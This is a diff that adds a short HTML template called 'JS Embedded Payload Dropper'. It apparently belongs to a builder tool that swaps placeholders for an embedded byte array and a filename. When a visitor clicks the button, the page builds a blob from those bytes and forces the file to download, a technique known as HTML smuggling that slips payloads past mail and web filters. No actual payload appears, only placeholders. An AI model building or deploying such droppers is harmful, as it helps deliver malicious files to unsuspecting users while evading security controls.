@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>JS Embedded Payload Dropper</title>
+</head>
+<body>
+  <h2>JS Embedded Payload Dropper</h2>
+  <p>Click below to download the embedded file.</p>
+  <button onclick="download()">Download Payload</button>
+  <script>
+    // your builder will substitute the byte list and filename here:
+    const payloadBytes = new Uint8Array([{array_placeholder}]);
+    function download() {
+      // create a blob from the byte array
+      const blob = new Blob([payloadBytes], { type: "application/octet-stream" });
+      // create a temporary link to trigger the download
+      const link = document.createElement("a");
+      link.href = URL.createObjectURL(blob);
+      link.download = "{filename_placeholder}";
+      link.click();
+      // optionally revoke the object URL after a moment
+      setTimeout(() => URL.revokeObjectURL(link.href), 100);
+    }
+  </script>
+</body>
+</html>
